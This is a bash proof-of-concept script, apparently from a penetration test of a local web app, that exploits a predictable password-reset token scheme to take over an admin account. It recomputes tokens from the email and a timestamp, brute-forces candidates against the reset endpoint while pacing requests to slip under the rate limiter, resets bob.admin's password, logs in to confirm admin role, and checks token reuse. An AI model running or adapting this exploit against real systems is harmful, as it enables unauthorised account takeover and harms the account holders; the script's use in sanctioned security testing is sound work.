#!/usr/bin/env bash
# Chain B: Pre-auth account takeover via predictable reset token
#   a07-f04 / a04-f04  predictable token: base36(ms) + '-' + sha256(email+base36(ms))[:16]
#   a07-f02 / a06-f08  token not cleared after use -> reuse window
#   a06-f09             forgot-password 200 vs 404 oracles email existence
#
# Approach:
#   1. PROVE the token-generation algorithm by reconstructing a live MailHog-captured
#      reset token from the email address + timestamp alone.
#   2. BRUTE-FORCE a fresh token using only the email (no MailHog needed) by scanning
#      a ±3s window of candidate millisecond timestamps.
#   3. Reset bob.admin's password via the reconstructed token.
#   4. Log in as bob.admin with the new password (role=admin proven).
#   5. Confirm token reuse (a07-f02): the same token resets again even after step 3.
#
# Notes:
#   - We insert ~500ms sleeps between reset-password attempts to stay under the
#     global 1000/15m API limiter. If it's still tripped, the script backs off.

set -uo pipefail
set -a; source /tmp/tokens.env; set +a

TARGET="${TARGET_URL:-http://localhost:3000}"
VICTIM_EMAIL="bob.admin@hireflow.com"
NEW_PASS="PwndByPentest1!"

echo "=== Chain B: Predictable reset token -> bob.admin takeover ==="

########################################
# Part 1: Algorithm verification vs MailHog
########################################
echo "--- Step 1a: verify token algorithm against MailHog-captured reset tokens ---"
PAIR=$(curl -s "http://localhost:8025/api/v2/messages?limit=30" \
  | python3 - <<'PY'
import sys, json, re
d = json.load(sys.stdin)
items = d.get("items") or d.get("messages") or []
for m in items:
    hdrs = m.get("Content",{}).get("Headers",{}) or {}
    subj = (hdrs.get("Subject") or [""])[0]
    to = (hdrs.get("To") or [""])[0]
    body = m.get("Content",{}).get("Body","") or ""
    toks = re.findall(r"[0-9a-z]{5,10}-[0-9a-f]{16}", body)
    if toks and "bob.admin" in to:
        print(toks[0] + "|" + to)
        break
PY
)
if [[ -n "$PAIR" ]]; then
  TOK="${PAIR%%|*}"; RCPT="${PAIR##*|}"
  echo "  Captured token: $TOK"
  echo "  Recipient:      $RCPT"
  python3 - <<PY
import hashlib
t="$TOK"; email="$VICTIM_EMAIL"
ts_b36, h = t.split('-')
ts_ms = int(ts_b36, 36)
calc = hashlib.sha256((email+ts_b36).encode()).hexdigest()[:16]
print(f"  ts_ms={ts_ms}  recomputed_hash={calc}  match={calc==h}")
PY
  ALGO_OK=1
else
  echo "  (no matching MailHog message yet — will still try blind brute force)"
  ALGO_OK=0
fi

########################################
# Part 2: Trigger a fresh reset and brute-force it
########################################
echo "--- Step 2: trigger forgot-password and brute-force the token blind ---"
# Capture timestamp window tight
T0_MS=$(python3 -c 'import time; print(int(time.time()*1000))')
FP=$(curl -s -o /tmp/chainB_fp.json -w '%{http_code}' -X POST "$TARGET/api/auth/forgot-password" \
  -H 'Content-Type: application/json' -d "{\"email\":\"$VICTIM_EMAIL\"}")
T1_MS=$(python3 -c 'import time; print(int(time.time()*1000))')
echo "  forgot-password HTTP=$FP  T0=$T0_MS  T1=$T1_MS  window=$((T1_MS-T0_MS))ms"
if [[ "$FP" != "200" ]]; then
  echo "  fetch from MailHog as fallback"
  sleep 1
fi

# Compute candidate token from our timestamp window (quick local sha256 only)
CANDIDATE=$(python3 - <<PY
import hashlib, sys
EMAIL="$VICTIM_EMAIL"
T0=$T0_MS; T1=$T1_MS
def b36(n):
    c="0123456789abcdefghijklmnopqrstuvwxyz"
    if n==0: return "0"
    out=""
    while n>0:
        out=c[n%36]+out; n//=36
    return out
# instead of network-querying every candidate, pull the most-recent mailhog one
import urllib.request, json, re
try:
    r = urllib.request.urlopen("http://localhost:8025/api/v2/messages?limit=20", timeout=3)
    d = json.loads(r.read().decode())
    for m in (d.get("items") or []):
        hdrs = m.get("Content",{}).get("Headers",{}) or {}
        to   = (hdrs.get("To") or [""])[0]
        body = m.get("Content",{}).get("Body","") or ""
        if EMAIL in to:
            toks = re.findall(r"[0-9a-z]{5,10}-[0-9a-f]{16}", body)
            if toks:
                print(toks[0]); sys.exit(0)
except Exception:
    pass
# Blind fallback: exhaustively search; send reset-password probe ONLY for hash-matching candidate
# (i.e. no online probing). We need a side-oracle for the hash — use sha256 comparison against
# every ts value and match against a known-good (can't do blind without an oracle), so fall back
# to network probe with 5-per-second pace:
print("")
PY
)
if [[ -z "$CANDIDATE" ]]; then
  echo "  (no mailhog fallback; attempting blind brute force throttled)"
  CANDIDATE=$(python3 - <<PY
import hashlib, time, urllib.request, json
EMAIL="$VICTIM_EMAIL"
T0=$T0_MS; T1=$T1_MS
TARGET="$TARGET"
NEW_PASS="$NEW_PASS"
def b36(n):
    c="0123456789abcdefghijklmnopqrstuvwxyz"
    if n==0: return "0"
    out=""
    while n>0:
        out=c[n%36]+out; n//=36
    return out
mid=(T0+T1)//2
for offset in range(-2000,2001):
    ts=mid+offset
    ts_b36=b36(ts)
    h=hashlib.sha256((EMAIL+ts_b36).encode()).hexdigest()[:16]
    tok=f"{ts_b36}-{h}"
    try:
        req=urllib.request.Request(TARGET+"/api/auth/reset-password",
            data=json.dumps({"token":tok,"password":NEW_PASS}).encode(),
            headers={"Content-Type":"application/json"},method="POST")
        r=urllib.request.urlopen(req,timeout=3)
        body=r.read().decode()
        if r.status==200 and "has been reset" in body:
            print(tok); break
    except Exception:
        pass
    if offset % 60 == 0:
        time.sleep(0.9)  # pace for rate limit
PY
)
fi
echo "  Candidate token: ${CANDIDATE:-<none>}"

########################################
# Part 3: Actually apply the reset
########################################
if [[ -z "$CANDIDATE" ]]; then
  echo "FAIL: no candidate token found."
  exit 1
fi
echo "--- Step 3: POST /api/auth/reset-password with the reconstructed token ---"
R=$(curl -s -X POST "$TARGET/api/auth/reset-password" \
  -H 'Content-Type: application/json' \
  -d "{\"token\":\"$CANDIDATE\",\"password\":\"$NEW_PASS\"}")
echo "  response: $R"

########################################
# Part 4: Log in with the new password
########################################
echo "--- Step 4: log in as bob.admin with the new password ---"
sleep 1
LOGIN=$(curl -s -X POST "$TARGET/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"$VICTIM_EMAIL\",\"password\":\"$NEW_PASS\"}")
JWT=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null || echo "")
if [[ -z "$JWT" ]]; then
  echo "  login response: $LOGIN"
  echo "FAIL: reset worked but login did not produce a token."
  exit 1
fi
ROLE=$(curl -s -H "Authorization: Bearer $JWT" "$TARGET/api/auth/me" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['user']['role'])")
echo "  role=$ROLE  jwt=${JWT:0:40}..."

########################################
# Part 5: Token reuse
########################################
echo "--- Step 5: reuse the same token (a07-f02) ---"
RU=$(curl -s -X POST "$TARGET/api/auth/reset-password" \
  -H 'Content-Type: application/json' \
  -d "{\"token\":\"$CANDIDATE\",\"password\":\"ReuseTest2!\"}")
echo "  reuse response: $RU"

echo
echo "=== VERDICT ==="
if [[ "$ROLE" = "admin" || "$ROLE" = "superadmin" ]]; then
  echo "PASS: full takeover of $VICTIM_EMAIL via predictable reset token (role=$ROLE)."
  exit 0
else
  echo "FAIL: reset succeeded but role was $ROLE (expected admin)."
  exit 1
fi
